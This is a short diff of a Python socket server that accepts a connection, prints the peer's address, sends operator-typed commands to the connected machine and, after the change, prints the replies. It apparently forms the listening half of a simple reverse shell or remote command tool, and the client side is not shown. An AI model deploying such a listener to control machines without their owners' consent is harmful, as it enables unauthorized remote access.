@@ -29,7 +29,7 @@ def bindn_socket():
 def socket_accpet():
     #conn-actual connection
     conn,address=s.accept()
-    print('Connection has been establish with IP'+ address[0]+ 'port:'+ str(address[1]))
+    print('Connection has been establish with IP'+ address[0]+ 'via port:'+ str(address[1]))
     send_command(conn)
     conn.close()
 
@@ -38,7 +38,7 @@ def socket_accpet():
 def send_command(conn):
     while True:
         cmd=input()
-        if cmd==quit():
+        if cmd=='quit':
             conn.close()
             s.close()
             sys.exit()
@@ -46,6 +46,8 @@ def send_command(conn):
 #sure that everything is going smoothly
         if len(str.encode(cmd))>0:
             conn.send(str.encode(cmd))
+            response=str(conn.recv(1024))
+            print(response)
 
 
 
